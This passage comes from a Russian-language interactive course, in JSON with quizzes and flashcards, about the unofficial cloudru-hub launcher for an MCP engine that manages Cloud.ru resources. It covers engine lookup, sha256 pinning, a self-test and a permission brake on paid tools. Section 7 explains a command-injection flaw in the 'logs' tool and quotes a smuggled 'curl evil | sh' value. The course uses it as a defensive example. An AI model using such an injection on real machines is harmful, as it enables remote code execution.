нчер MCP-движка cloudru-vm: что он делает сам, а что отдаёт движку.","icon":"🧭","interactiveType":"flashcards","keyConcept":"лаунчер, который находит движок","methodPattern":"P3","source":"README.md","theory":"Лена только что получила доступ к Cloud.ru Evolution и хочет одного: сказать Claude Code «подними стенд» — и чтобы стенд поднялся. Её первый вопрос был таким же, как у тебя: «а что вообще такое cloudru-hub, если сам движок — это отдельная Go-программа?»\n\nОтвет короткий: **cloudru-hub — это лаунчер, который находит движок и запускает его.** Лаунчер — тонкая обёртка на JavaScript без единой зависимости: она ищет бинарник движка `cloudru-vm` на твоей машине, сверяет его хеш и запускает как MCP-сервер. Сам движок — Go-программа со **144 инструментами** (число измерено живым запросом `tools/list`, снимок лежит в `data/tools-list-snapshot.json`): виртуалки, Kubernetes, PostgreSQL, Kafka, Redis, DNS, S3, сертификаты, биллинг и мастер деплоя docker-compose.\n\nЧто лаунчер добавляет от себя, кроме запуска:\n\n- **тормоз платных шагов** — правила разрешений и вето-хук, чтобы агент спрашивал перед каждым действием, которое стоит денег;\n- **установщики под конкретную платформу** — Claude Code получает полную связку, остальные ровно столько, сколько можно доставить честно;\n- **компилятор диалектов навыка** — из одного канонического текста собирает варианты под разные платформы.\n\nВажная оговорка, которую пакет повторяет на каждом шагу: он **неофициальный** и никак не связан с Cloud.ru — просто разговаривает с публичным API через движок.\n\nПакет живёт на npm: [страница @dzhechkov/cloudru-hub на npmjs.com](https://www.npmjs.com/package/@dzhechkov/cloudru-hub), исходники — в [публичном зеркале на GitHub](https://github.com/djd1m/dz-harness/tree/main/packages/@dzhechkov/cloudru-hub).\n\n**Компромисс:** движок не лежит внутри пакета, и это создаёт лишний шаг — его нужно откуда-то взять и показать лаунчеру. Взамен ты получаешь лаунчер, который никогда не запустит неизвестный бинарник молча: он всегда скажет, где нашёл движок и совпал ли хеш.\n\n🧾 **Квитанция.** Первое, что Лена набрала: `cloudru-hub help`. Одна страница текста, exit 0 — лаунчер жив и рассказывает про семь команд. Что означает каждая — разберём по ходу курса.","reflection":{"strengths":"Лаунчер без зависимостей: находит движок, сверяет хеш и запускает — плюс тормоз платных шагов, установщики и компилятор диалектов, которых у голого движка нет.","weaknesses":"Движок нужно добыть отдельно и показать лаунчеру; пакет неофициальный, поддержки от Cloud.ru нет.","rating":"5/5 за честность к пользователю, 3/5 за порог входа","wrapup":"cloudru-hub — лаунчер, который находит движок, сверяет его и ставит тормоз между агентом и твоим счётом."},"exercise":{"cards":[{"front":"Что такое cloudru-hub одной фразой?","back":"Лаунчер, который находит движок cloudru-vm, сверяет его хеш и запускает как MCP-сервер — плюс тормоз платных шагов, установщики и компилятор диалектов."},{"front":"Сколько инструментов у движка и откуда известно число?","back":"144 — измерено живым запросом tools/list; снимок лежит в data/tools-list-snapshot.json."},{"front":"Лежит ли движок внутри npm-пакета?","back":"Нет. Лаунчер находит движок на машине во время запуска — бинарник в пакете не лежит."},{"front":"Это официальный инструмент Cloud.ru?","back":"Нет. Пакет неофициальный и не связан с Cloud.ru; он лишь обращается к публичному API Evolution через движок."}]},"quiz":[{"id":"what-is-q1","question":"Лена говорит: «cloudru-hub — это и есть движок с 144 инструментами». Что она путает?","options":["Ничего, всё верно","cloudru-hub — лаунчер: он находит движок cloudru-vm и запускает его, а 144 инструмента живут в движке","cloudru-hub — облачная панель Cloud.ru","cloudru-hub — плагин для Kubernetes"],"correctAnswer":1,"explanation":"Инструменты — в Go-движке. Лаунчер находит его, сверяет хеш, запускает и добавляет тормоз, установщики и компилятор диалектов."}],"finalTest":{"id":"final-what-is-cloudru-hub","sectionId":"what-is-cloudru-hub","question":"Что делает cloudru-hub?","options":["Работает лаунчером: находит движок cloudru-vm, сверяет его хеш и запускает как MCP-сервер","Содержит внутри себя Go-движок с 144 инструментами","Является официальной CLI-утилитой Cloud.ru","Заменяет Claude Code при работе с облаком"],"correctAnswer":0},"diagram":{"kind":"parts","title":"Из чего состоит рабочая связка «агент → Cloud.ru»","whole":"Связка Claude Code ↔ Cloud.ru","nodes":[{"id":"launcher","label":"Лаунчер","note":"находит движок, сверяет хеш, запускает","accent":true},{"id":"engine","label":"Движок cloudru-vm","note":"144 инструмента, лежит вне пакета"},{"id":"brake","label":"Тормоз","note":"allow / ask / deny + вето-хук"},{"id":"installer","label":"Установщик","note":".mcp.json и настройки под платформу"}]}},{"id":"what-ships-here","order":2,"title":"2. Что лежит в пакете — и чего в нём нет по замыслу","shortTitle":"Что в пакете","description":"Пять частей нашего кода и ноль байтов чужого движка: как пакет разложен и почему.","icon":"🧱","interactiveType":"matching","keyConcept":"ноль байтов движка в пакете","methodPattern":"D4","source":"README.md#what-ships-here-our-code-only-adr-002","theory":"Лена сделала то, что делает любой инженер с новым пакетом: `npm pack --dry-run`, чтобы посмотреть, что реально уедет в архив. И удивилась: ни одного бинарника, ни одного файла на Go. «Где движок?»\n\nЭто не забывчивость, а правило пакета: **ноль байтов движка в пакете** (решение ADR-002). Дело в авторстве. Основа — оригинальный Go CLI и всё, что лежит в этом пакете (лаунчер, адаптеры, установщик, тесты), — работа Дмитрия Жечкова под MIT. А **дополнения движка** — слой из ~144 MCP-инструментов — написал [Тимур](https://shkrbkv.ru/about/), автор движка Hermes. Он одобрил публикацию (запись о согласии — в LICENSE, часть 2, строка `Grant-Confirmation:`), но лицензии на сами дополнения не назначал. Поэтому пакет не даёт третьим лицам никаких прав на них — и физически не содержит их.\n\nЧто в пакете лежит (всё — наш код):\n\n1. **Лаунчер** `bin/cloudru-hub.js` — находит движок во время запуска и сверяет sha256 с пином в `package.json`.\n2. **Тормоз платных шагов** `src/install.js` + `templates/.claude/hooks/` — правила ask/deny/allow и вето-хук.\n3. **Ярусы целевых платформ** — тот же `src/install.js` решает, кому полная установка, кому только указатель.\n4. **Компилятор диалектов** `src/dialects.js` + `data/dialects.json` — генерирует варианты навыка под платформы.\n5. **Золотая классификация** `data/tools-classification.json` — каждый инструмент движка → allow/ask/deny.\n\nЧего в пакете НЕТ по замыслу: бинарника движка, исходников на Go и канонического корпуса навыка. Их лаунчер берёт снаружи — из дистрибутива движка, который ты укажешь сам.\n\n**Компромисс:** такая раскладка честна по авторству и проверяется тестом (тест перебирает список файлов из `npm pack --dry-run` и отклоняет ELF-магию, `.go`-файлы и пути движка). Но она же означает, что «просто `npm i` и работает» не будет — движок придётся добыть отдельно.\n\n🧾 **Квитанция.** У Лены `npm pack --dry-run` показал `bin/`, `src/`, `templates/`, `data/`, `docs/`, `test/` и документы лицензии — и ни одного файла, которого она не смогла бы прочитать глазами.","reflection":{"strengths":"Раскладка честна по авторству: наш код под MIT лежит в пакете, чужие дополнения движка — нет; правило «ноль байтов движка» защищено тестом по списку файлов архива.","weaknesses":"Пакет не самодостаточен: движок и канонический навык нужно принести отдельно из дистрибутива движка.","rating":"5/5","wrapup":"В пакете пять частей нашего кода и ноль байтов движка — авторство разделено физически, а не оговоркой в README."},"exercise":{"pairs":[{"left":"bin/cloudru-hub.js","right":"Лаунчер: находит движок во время запуска, сверяет sha256 с пином"},{"left":"data/tools-classification.json","right":"Золотая классификация: каждый инструмент движка → allow / ask / deny"},{"left":"src/dialects.js + data/dialects.json","right":"Компилятор диалектов: варианты навыка под платформы из одного канона"},{"left":"Бинарник движка и исходники на Go","right":"В пакете НЕ лежат: ноль байтов движка, приносятся снаружи"},{"left":"templates/.claude/hooks/","right":"Вето-хук тормоза платных шагов"}]},"quiz":[{"id":"ships-q1","question":"Почему в архиве пакета нет ни одного файла движка?","options":["Забыли добавить в files[]","Правило ADR-002: ноль байтов движка в пакете — дополнения движка написал другой автор и лицензии на них не назначал; лаунчер берёт движок снаружи","Движок слишком большой для npm","Движок распространяется только через Docker"],"correctAnswer":1,"explanation":"Авторство разделено физически: наш код под MIT — в пакете, дополнения движка Тимура — вне его. Тест по списку файлов архива не даст это нарушить."}],"finalTest":{"id":"final-what-ships-here","sectionId":"what-ships-here","question":"Какое правило описывает содержимое пакета cloudru-hub?","options":["Ноль байтов движка в пакете: только наш код, движок приносится снаружи","Движок вшит в пакет для удобства установки","В пакете лежат только исходники на Go","Пакет содержит канонический корпус навыка целиком"],"correctAnswer":0},"diagram":{"kind":"compare","title":"Что в пакете, а что снаружи — граница проходит по авторству","nodes":[{"id":"ours","label":"В пакете (MIT)","note":"код Дмитрия Жечкова","items":["лаунчер bin/","установщик и хук","компилятор диалектов","золотая классификация","тесты"],"accent":true},{"id":"theirs","label":"Снаружи","note":"дополнения движка Тимура","items":["бинарник cloudru-vm","исходники на Go","канонический корпус навыка"]}]}},{"id":"engine-resolution-order","order":3,"title":"3. Где движок: три пути поиска и один громкий отказ","shortTitle":"Поиск движка","description":"CLOUDRU_VM_BIN → config.json → платформенный пакет → понятная ошибка: как лаунчер ищет бинарник.","icon":"🔍","interactiveType":"drag-and-drop","keyConcept":"порядок поиска движка","methodPattern":"P6","source":"src/resolve.js","theory":"Раз движка в пакете нет, лаунчер должен его найти. Лена запустила `cloudru-hub resolve` на чистой машине и получила не пустой экран, а подробный отказ с тремя пунктами: где искали и почему не нашли. Прежде чем читать дальше, реши за неё: какой из трёх путей ты бы выбрал для своего ноутбука, а какой — для сервера команды?\n\n**Порядок поиска движка** зашит в `src/resolve.js` и всегда один и тот же — первое попадание побеждает:\n\n1. Переменная окружения **`$CLOUDRU_VM_BIN`** — явный путь. Самый простой способ, именно им пользуется локальная проверка.\n2. Поле **`enginePath`** в файле `~/.cloudru-hub/config.json` (путь к файлу можно переопределить через `$CLOUDRU_HUB_CONFIG`) — постоянная настройка.\n3. Платформенный пакет **`@dzhechkov/cloudru-vm-linux-x64`** с бинарником внутри — если он установлен рядом. Внимание: этого пакета на npm пока НЕТ: его первая публикация ждёт доверенной CI-сборки.\n4. Ничего не нашли → **громкий отказ**: лаунчер печатает все три пути, что по каждому было (не задано / задано, но это не файл) и куда идти за движком (`docs/LOCAL-TESTING.md`).\n\nКандидат, который есть в списке, но не является обычным файлом, просто пропускается — поиск идёт дальше по цепочке.\n\n**Компромисс:** порядок фиксирован, и это удобно (всегда знаешь, что перебьёт что: переменная окружения сильнее конфига), но он же не даёт тебе «подсунуть» путь четвёртым способом. Если движок лежит в нестандартном месте — либо переменная, либо конфиг.\n\n🧾 **Квитанция.** Лена экспортировала `CLOUDRU_VM_BIN=/path/to/engine-build/cloudru-vm` и повторила `cloudru-hub resolve`: строка `source   env` — движок найден через первый путь, а следом sha256 и вердикт по пину. Про пин — следующая секция.","reflection":{"strengths":"Порядок поиска движка предсказуем и один на все команды; отказ громкий и объясняет все три пути; ничего не скачивается из сети.","weaknesses":"Только три пути и жёсткий порядок; платформенный пакет пока не опубликован, так что на практике остаются переменная и конфиг.","rating":"4/5","wrapup":"Переменная окружения → config.json → платформенный пакет → громкий отказ: порядок поиска движка выучи один раз и больше не гадай."},"exercise":{"instruction":"Лена настраивает лаунчер на новой машине. Расставь пути в том порядке, в котором лаунчер ищет движок (порядок поиска движка из src/resolve.js).","items":[{"id":"env-var","label":"Переменная окружения $CLOUDRU_VM_BIN"},{"id":"config-file","label":"Поле enginePath в ~/.cloudru-hub/config.json"},{"id":"platform-pkg","label":"Платформенный пакет @dzhechkov/cloudru-vm-linux-x64 (если установлен)"},{"id":"loud-error","label":"Громкий отказ: печать всех трёх путей и совета, где взять движок"}],"correctOrder":["env-var","config-file","platform-pkg","loud-error"]},"quiz":[{"id":"resolve-q1","question":"У Лены задана и переменная CLOUDRU_VM_BIN, и enginePath в config.json, и они указывают на разные файлы. Какой движок запустится?","options":["Из config.json — постоянная настройка важнее","Из переменной окружения — она первая в порядке поиска","Лаунчер откажет из-за конфликта","Тот, у которого новее дата изменения"],"correctAnswer":1,"explanation":"Первое попадание побеждает, а переменная окружения стоит первой в цепочке."}],"finalTest":{"id":"final-engine-resolution-order","sectionId":"engine-resolution-order","question":"Каков порядок поиска движка у лаунчера?","options":["$CLOUDRU_VM_BIN → enginePath в ~/.cloudru-hub/config.json → платформенный пакет → громкий отказ","Платформенный пакет → config.json → переменная окружения","Скачивание из сети → локальный кеш","Только переменная окружения, других путей нет"],"correctAnswer":0},"diagram":{"kind":"flow","title":"Порядок поиска движка: первое попадание побеждает","nodes":[{"id":"env","label":"$CLOUDRU_VM_BIN","note":"явный путь — для локальной проверки","accent":true},{"id":"cfg","label":"config.json","note":"enginePath в ~/.cloudru-hub/"},{"id":"pkg","label":"Платформ. пакет","note":"cloudru-vm-linux-x64 — пока не опубликован"},{"id":"err","label":"Громкий отказ","note":"все три пути и совет, где взять движок"}]}},{"id":"sha256-pin","order":4,"title":"4. Сверка sha256 с пином: когда терпеть, а когда отказывать","shortTitle":"Пин sha256","description":"Один и тот же несовпавший хеш для разных источников значит разное — и это осознанное решение.","icon":"🔐","interactiveType":"quiz","keyConcept":"сверка sha256 с пином","methodPattern":"P9","source":"src/resolve.js","theory":"Вот вопрос, на который нет очевидного ответа, — подумай над ним ДО того, как читать дальше. Лена собрала движок сама, из исходников, и указала на него переменной окружения. Хеш не совпал с закреплённым. Должен ли лаунчер отказаться его запускать?\n\nСначала термины. **Пин** — закреплённый в `package.json` (поле `cloudruHub.binaryHashes`) хеш sha256 эталонного бинарника: `59f83fc0…c05124` для `linux-x64`, движок `cloudru-vm 0.2.3-20260718`. **Сверка sha256 с пином** — лаунчер хеширует найденный файл и сравнивает с пином. Дальше начинается интересное: реакция на несовпадение зависит от того, ОТКУДА пришёл движок.\n\n- **Платформенный пакет** (источник `platform-package`): несовпадение — **жёсткий отказ**. Это артефакт из реестра, он обязан быть байт-в-байт равен пину — иначе кто-то подменил его по дороге (правило цепочки поставок ADR-002).\n- **Переменная окружения или конфиг** (источники `env` / `config`): несовпадение **терпится**, но честно сообщается: `verified NO — not the pinned baseline`. Владелец сам указал на этот файл — значит, это его сборка для разработки, и он имеет право её запустить.\n\nТак что ответ на вопрос про сборку Лены: лаунчер запустит её, но не станет делать вид, что это эталон. `cloudru-hub resolve --json` вернёт `verified: false`, и это правда, а не ошибка.\n\n**Компромисс:** мягкость к своим путям — удобство для разработчика и одновременно дыра, если ты по привычке экспортируешь `CLOUDRU_VM_BIN` на чужой файл. Лаунчер защищает от подмены в реестре, а не от тебя самого. Читай строку `verified` глазами.\n\n🧾 **Квитанция.** Лена на эталонном бинарнике: `verified yes — matches the pinned baseline`. На своей сборке: `verified NO — not the pinned baseline (tolerated for env/config paths)`. Обе строки — из вывода `cloudru-hub resolve`.","reflection":{"strengths":"Сверка sha256 с пином закрывает подмену артефакта в реестре жёстко, а сборку разработчика пропускает честно, с явной пометкой verified: false.","weaknesses":"Для путей env/config лаунчер только предупреждает — от файла, на который ты сам указал по ошибке, он не защитит.","rating":"4/5","wrapup":"Несовпавший хеш из реестра — отказ, из твоего пути — предупреждение; смотри на строку verified, а не на факт запуска. Вспомни свой ответ до объяснения: совпал ли он с тем, как решает лаунчер?"},"exercise":{},"quiz":[{"id":"pin-q1","question":"Лена установила платформенный пакет, и sha256 его бинарника не совпал с пином. Что сделает лаунчер?","options":["Запустит движок и напишет verified: false","Откажется запускать: артефакт из реестра обязан совпадать с пином байт-в-байт","Скачает правильную версию автоматически","Спросит у пользователя, продолжать ли"],"correctAnswer":1,"explanation":"Для источника platform-package несовпадение sha256 — жёсткий отказ по правилу цепочки поставок ADR-002."},{"id":"pin-q2","question":"А если несовпавший sha256 у движка, на который указывает CLOUDRU_VM_BIN?","options":["Тоже жёсткий отказ","Запуск разрешён, но в выводе будет verified NO — сборка разработчика терпится, а не выдаётся за эталон","Лаунчер молча запустит и ничего не скажет","Лаунчер перепишет пин на новый хеш"],"correctAnswer":1,"explanation":"На владельца, который сам указал путь, лаунчер полагается — но честно печатает, что это не закреплённый эталон."}],"finalTest":{"id":"final-sha256-pin","sectionId":"sha256-pin","question":"Как лаунчер реагирует на несовпадение sha256 с пином?","options":["Зависит от источника: из платформенного пакета — жёсткий отказ, из переменной или конфига — запуск с пометкой verified: false","Всегда отказывается запускать движок","Всегда запускает, хеш нужен только для справки","Автоматически обновляет пин в package.json"],"correctAnswer":0},"diagram":{"kind":"compare","title":"Один несовпавший хеш — два разных решения","nodes":[{"id":"registry","label":"Из реестра","note":"источник platform-package","items":["обязан совпасть байт-в-байт","несовпадение = отказ","защита от подмены артефакта"],"accent":true},{"id":"own","label":"Свой путь","note":"источники env / config","items":["сборка разработчика","запуск с verified: false","ответственность на владельце"]}]}},{"id":"self-test-five-steps","order":5,"title":"5. self-test: пять шагов до ALL GREEN","shortTitle":"self-test","description":"Одна команда проверяет всю цепочку: движок найден, хеш сверен, версия отвечает, 144 инструмента живы, классификация полная.","icon":"🩺","interactiveType":"builder","keyConcept":"self-test: пять шагов до ALL GREEN","methodPattern":"P5","source":"README.md#local-testing-works-now-no-publish","theory":"Хватит читать — Лена уже открыла терминал в папке пакета, открывай и ты. Никаких учётных данных Cloud.ru для этого шага не нужно: запрос `tools/list` движок отвечает без ключей.\n\nКоманда одна: `node bin/cloudru-hub.js self-test` (или просто `cloudru-hub self-test`, если сделал `npm link`). Она проходит **пять шагов до ALL GREEN**, и каждый печатает свою строку:\n\n1. **resolve** — где найден движок и через какой путь (`source: env`).\n2. **sha256** — хеш файла и совпал ли он с пином (`MATCHES pinned baseline`).\n3. **engine-version** — движок запущен с аргументом `version` и ответил: `cloudru-vm 0.2.3-20260718`.\n4. **tools-list** — живой JSON-RPC-запрос `tools/list`: `144 tools live (snapshot: 144)`.\n5. **classification-coverage** — каждый живой инструмент есть в золотой классификации (`144 golden entries`).\n\nЕсли все пять зелёные — последняя строка `self-test: ALL GREEN` и exit 0. Любой красный шаг — `self-test: FAILED`, exit 1, и цепочка останавливается там, где сломалась: без движка не будет версии, без версии — списка инструментов.\n\nФлаг `--json` отдаёт тот же результат структурой `{ steps: [...], ok: true }` — удобно для скриптов и CI.\n\n**Компромисс:** self-test доказывает, что связка живая и движок тот самый, но НЕ трогает облако — ни одной виртуалки он не создаст и ни рубля не потратит. Это его сила (безопасно гонять сколько угодно) и его граница: что реальные вызовы инструментов работают с твоими ключами, он не проверяет.\n\n🧾 **Квитанция.** Пять строк с галочками и `self-test: ALL GREEN` — ровно такой вывод зафиксирован в `docs/LOCAL-TESTING.md` как измеренный на эталонном бинарнике. Лена сверила свой экран с ним построчно.","reflection":{"strengths":"Одна команда проверяет всю цепочку — от пути к движку до полноты классификации; без учётных данных и без затрат; --json для автоматизации.","weaknesses":"Не проверяет реальные вызовы инструментов с ключами Cloud.ru; при первом же красном шаге останавливается, а не показывает остальные.","rating":"5/5","wrapup":"self-test: пять шагов до ALL GREEN — прогоняй его после каждой смены движка, это бесплатно."},"exercise":{"instruction":"Собери команду, которой Лена запускает self-test прямо из папки пакета (без npm link), чтобы пройти пять шагов до ALL GREEN.","parts":["node","bin/cloudru-hub.js","self-test"],"correctCommand":"node bin/cloudru-hub.js self-test","hints":["Без npm link лаунчер запускается через node и путь к bin/cloudru-hub.js","Подкоманда называется self-test"]},"quiz":[{"id":"selftest-q1","question":"self-test у Лены упал на шаге tools-list. Что это значит?","options":["Ключи Cloud.ru неверные","Движок найден и запускается, но на JSON-RPC-запрос tools/list не ответил валидной строкой — до классификации дело не дошло","Классификация неполная","Пин sha256 не совпал"],"correctAnswer":1,"explanation":"Шаги идут по цепочке: resolve и sha256 уже прошли, версия ответила, а вот живой список инструментов не получен — цепочка остановилась здесь."}],"finalTest":{"id":"final-self-test-five-steps","sectionId":"self-test-five-steps","question":"Что проверяет команда cloudru-hub self-test?","options":["Пять шагов до ALL GREEN: поиск движка, sha256, версию движка, живой tools/list и полноту классификации — без учётных данных","Реальное создание виртуалки в Cloud.ru","Только версию самого лаунчера","Правильность ключей CLOUDRU_KEY_ID и CLOUDRU_SECRET"],"correctAnswer":0},"diagram":{"kind":"flow","title":"Пять шагов self-test — цепочка рвётся на первом красном","nodes":[{"id":"resolve","label":"resolve","note":"движок найден, источник назван"},{"id":"sha","label":"sha256","note":"совпал с пином или нет"},{"id":"version","label":"engine-version","note":"cloudru-vm 0.2.3-20260718"},{"id":"tools","label":"tools-list","note":"144 живых инструмента","accent":true},{"id":"coverage","label":"coverage","note":"каждый живой инструмент классифицирован"}]}},{"id":"paid-step-brake","order":6,"title":"6. Тормоз платных шагов: allow, ask, deny","shortTitle":"Тормоз","description":"144 инструмента делятся на 77 allow, 65 ask и 2 deny — и неизвестный инструмент запрещён по умолчанию.","icon":"🛑","interactiveType":"scenario","keyConcept":"тормоз платных шагов","methodPattern":"P8","source":"data/tools-classification.json","theory":"Вот и главный страх Лены: агент ночью решил «оптимизировать» и поднял три виртуалки. Ответ пакета на этот страх — **тормоз платных шагов** (решение ADR-004): между агентом и каждым инструментом движка стоит правило разрешений, а сверху — вето-хук.\n\nПравила рождаются из **золотой классификации** `data/tools-classification.json`: у каждого из 144 инструментов есть `effect` (что он делает) и `permission` (что разрешено). Счёт на сегодня — числа из самого файла:\n\n- **allow — 77 инструментов.** Только чтение: `status`, `vm_list`, `list_zones`, `deploy_plan` и подобные. Агент зовёт их без вопросов.\n- **ask — 65 инструментов.** Всё, что изменяет облако или дотягивается до shell: `deploy`, `provision`, `vm_exec`, `destroy`, `k8s_create`, `k8s_kubectl`… Перед каждым вызовом Claude Code спросит тебя.\n- **deny — 2 инструмента.** `secret_value` и `cert_private_key` — читалки секретов. Агент их не получит вообще.\n\nПравила пишутся в `.claude/settings.json` в ДВУХ написаниях — `mcp__cloudru-vm__*` и `mcp__cloudru_vm__*`, — потому что какое из них использует среда выполнения, пока не проверено живой пробой. Лишнее правило безвредно, а вот пропущенное — нет.\n\nИ самое важное правило — про то, чего в файле НЕТ: **живой инструмент, неизвестный классификации, — это находка дрейфа, запрет по умолчанию.** Появился в движке новый инструмент — self-test упадёт на шаге coverage и назовёт его по имени, а не пропустит молча.\n\n**Компромисс:** 65 вопросов «можно?» — это трение. Лена поначалу ворчала. Но каждый вопрос — это ровно тот момент, когда деньги ещё не потрачены. Тормоз меняет удобство на предсказуемость счёта, и обратной сделки пакет не предлагает.\n\nПрежде чем перейти к упражнению, реши сам: куда бы ты отнёс инструмент, который только читает состояние, но при этом запускает следующий шаг задания на сервере? Ответ — в следующей секции; здесь Лена решает три случая попроще.","reflection":{"strengths":"Тормоз платных шагов делит все 144 инструмента поимённо: 77 allow / 65 ask / 2 deny; неизвестный инструмент запрещён по умолчанию и виден как дрейф; оба написания префикса покрыты.","weaknesses":"65 подтверждений — заметное трение; двойное написание префикса — временная мера, пока живая проба не назвала верное.","rating":"5/5","wrapup":"Тормоз платных шагов: читать — можно, менять — спроси, секреты — никогда, неизвестное — запрещено. Запомни свой ответ про «читающий, но продвигающий» инструмент — сейчас проверим."},"exercise":{"title":"Лена размечает три инструмента — куда их отнесёт тормоз платных шагов?","scenario":"Лена читает золотую классификацию и проверяет себя на трёх случаях. Помоги ей выбрать правильное разрешение для каждого.","steps":[{"description":"Шаг 1. Инструмент deploy создаёт виртуалку и ставит на неё приложение. Какое разрешение?","options":[{"text":"ask — перед каждым вызовом Claude Code спросит подтверждение","result":"positive","feedback":"Верно. deploy изменяет облако и стоит денег; в классификации он помечен как mutating без гейта движка — потому ask."},{"text":"allow — деплой и есть цель всей связки, пусть работает без вопросов","result":"negative","feedback":"Именно так рождается ночной счёт. Всё, что создаёт платные ресурсы, стоит за ask — 65 таких инструментов."},{"text":"deny — слишком опасно, запретить совсем","feedback":"Не ошибка по духу, но так связка потеряет смысл: deny оставлен только двум читалкам секретов."}]},{"description":"Шаг 2. Инструмент secret_value возвращает значение секрета из хранилища. Какое разрешение?","options":[{"text":"deny — агент не должен видеть секреты вообще","result":"positive","feedback":"Да. secret_value и cert_private_key — единственные два deny: секрет, попавший в контекст модели, уже утёк."},{"text":"ask — пусть спросит, иногда секрет нужен","result":"negative","feedback":"Один раз нажатое «да» — и приватный ключ в истории диалога. Тормоз платных шагов для секретов не спрашивает, а отказывает."},{"text":"allow — это же чтение, оно бесплатное","result":"negative","feedback":"Бесплатное — не значит безопасное. allow даётся только читалкам, которые не выносят секреты."}]},{"description":"Шаг 3. После обновления движка self-test сообщил: UNCLASSIFIED live tools: vm_snapshot_create. Что произошло?","options":[{"text":"Дрейф: в движке появился инструмент, которого нет в золотой классификации — он запрещён по умолчанию, пока его не разметят","result":"positive","feedback":"Верно. Неизвестное — не «наверное можно», а находка дрейфа: разметь инструмент в data/tools-classification.json, и coverage снова зелёный."},{"text":"Ничего страшного, новый инструмент автоматически попадёт в allow","result":"negative","feedback":"Ровно наоборот: тормоз платных шагов запрещает неизвестное по умолчанию. Тихого allow здесь нет по построению."},{"text":"Лаунчер сломан, нужно переустановить пакет","feedback":"Лаунчер как раз работает: он честно назвал незнакомый инструмент по имени вместо того, чтобы пропустить его."}]}]},"quiz":[{"id":"brake-q1","question":"Сколько инструментов движка тормоз платных шагов относит к ask и почему именно они?","options":["144 — все инструменты требуют подтверждения","65 — каждый инструмент, который изменяет облако или дотягивается до shell","2 — только deploy и destroy","77 — все инструменты чтения"],"correctAnswer":1,"explanation":"77 allow (чтение), 65 ask (изменяющие или shell-достигающие), 2 deny (читалки секретов) — числа из data/tools-classification.json."}],"finalTest":{"id":"final-paid-step-brake","sectionId":"paid-step-brake","question":"Как тормоз платных шагов обходится с живым инструментом, которого нет в золотой классификации?","options":["Запрещает по умолчанию и показывает как находку дрейфа на шаге coverage","Разрешает, раз движок его знает","Спрашивает подтверждение как для ask","Удаляет инструмент из движка"],"correctAnswer":0},"diagram":{"kind":"scale","title":"Четыре ступени тормоза: чем ниже, тем меньше доверия","topLabel":"свободно · агент зовёт сам","bottomLabel":"закрыто · агент не получит","nodes":[{"id":"allow","label":"allow — 77","note":"только чтение: status, vm_list, list_zones"},{"id":"ask","label":"ask — 65","note":"меняет облако или shell: deploy, vm_exec, k8s_kubectl","accent":true},{"id":"deny","label":"deny — 2","note":"secret_value, cert_private_key"},{"id":"unknown","label":"неизвестное","note":"не в классификации → запрет по умолчанию, дрейф"}]}},{"id":"behaviour-audit-not-schema","order":7,"title":"7. Схема — не доказательство: поведенческий аудит","shortTitle":"Аудит поведения","description":"Два инструмента выглядели безобидно по описанию — и оба оказались опасны. Почему allow даётся только по коду.","icon":"🕵️","interactiveType":"flashcards","keyConcept":"поведенческий аудит обработчика","methodPattern":"P4","source":"README.md#safety-properties-all-layer-1-discrimina","theory":"Сюрприз этой секции неприятный: **инструмент, который по описанию только читает, может тратить деньги.** Помнишь вопрос из прошлой секции? Вот ответ Лены — и он был неверным.\n\nПервый пример — `stack_status`. По схеме — «статус стека», читалка. Первая версия классификации так его и отнесла: у него нет свойства `confirmed`, значит, безопасен. Потом кто-то прочитал обработчик в движке (`tools_stack.go:479`): `stack_status` **продвигает** запланированное задание на следующий шаг на стороне сервера и сам вызывает платные инструменты создания. Воспроизведено вживую: один вызов перевёл задание из `planned` в `running` и попытался выполнить `provision`. Цепочка `stack_plan → stack_status` без единого вопроса пользователю — вот что открыл бы allow. Теперь `stack_status` — ask.\n\nВторой пример — `logs`. «Показать логи», что может быть безобиднее? Обработчик берёт аргумент `service` и **без экранирования** приклеивает его к команде `docker compose logs \u003cservice\u003e`, которая выполняется на твоей виртуалке по SSH (`engine/logs.go:61`). Значит, `service = \"app; curl evil | sh\"` — выполнение произвольного кода на твоей машине. Классификатор не может исправить движок (автору движка сообщено), но может поставить `logs` за ask — и поставил.\n\nОтсюда правило пакета: **allow даётся только по поведенческому аудиту обработчика.** Поведенческий аудит — это когда кто-то прочитал код обработчика инструмента в движке на закреплённой версии и записал в классификацию, что именно он делает, с ссылкой файл:строка. Схема инструмента — его описание и список аргументов — для allow недостаточна никогда. Посмотри на запись `status` в `data/tools-classification.json`: «читает локальный файл состояния, без обращения к облаку, без записи, без вызова других инструментов, `tools.go:1720`». Вот как выглядит основание для allow.\n\n**Компромисс:** аудит по коду дорог — 77 обработчиков прочитаны глазами, и при каждом обновлении движка это придётся повторить для изменившихся. Зато оба этих «безобидных» инструмента — измеренные случаи, а не гипотезы; эвристика по схеме уже ошиблась один раз, и пакет не даёт ей второго шанса.\n\nЛена после этой секции перестала верить описаниям: «читает» — это слово, а не свойство.","reflection":{"strengths":"allow только по поведенческому аудиту обработчика с ссылкой файл:строка; две реальные ловушки (stack_status продвигает платные задания, logs — инъекция команды по SSH) закрыты и защищены тестами.","weaknesses":"Аудит по коду дорог и привязан к закреплённой версии движка — обновление движка требует перечитать изменившиеся обработчики; сам дефект logs классификатор исправить не может, только поставить за ask.","rating":"5/5","wrapup":"Описание инструмента — не доказательство: allow получает только тот обработчик, чей код прочитан. Сравни свой ответ про «читающий, но продвигающий» с судьбой stack_status."},"exercise":{"cards":[{"front":"Почему stack_status стоит за ask, хотя по названию это читалка?","back":"Поведенческий аудит обработчика (tools_stack.go:479) показал: он продвигает запланированное задание на сервере и сам вызывает платные инструменты создания. Воспроизведено вживую."},{"front":"Чем опасен logs?","back":"Аргумент service без экранирования приклеивается к docker compose logs, выполняемой на твоей ВМ по SSH (engine/logs.go:61) — это выполнение произвольного кода. Поэтому ask."},{"front":"Что требуется, чтобы инструмент получил allow?","back":"Поведенческий аудит обработчика на закреплённой версии движка: прочитанный код, вывод «только чтение» и ссылка файл:строка в записи классификации. Схемы недостаточно."},{"front":"Какая эвристика однажды ошиблась?","back":"«Нет свойства confirmed — значит, безопасно». Она отнесла stack_status к allow. Ошибка измерена, и пакет больше не полагается на форму схемы."}]},"quiz":[{"id":"audit-q1","question":"Лена предлагает перевести logs обратно в allow: «это же просто чтение логов». Что ей ответить?","options":["Согласиться — чтение бесплатно","Отказать: аудит обработчика показал инъекцию команды через аргумент service по SSH; allow спрятал бы её за молчаливым разрешением, и тест на это свойство станет красным","Перевести в deny","Спросить у Cloud.ru"],"correctAnswer":1,"explanation":"Это одно из именованных 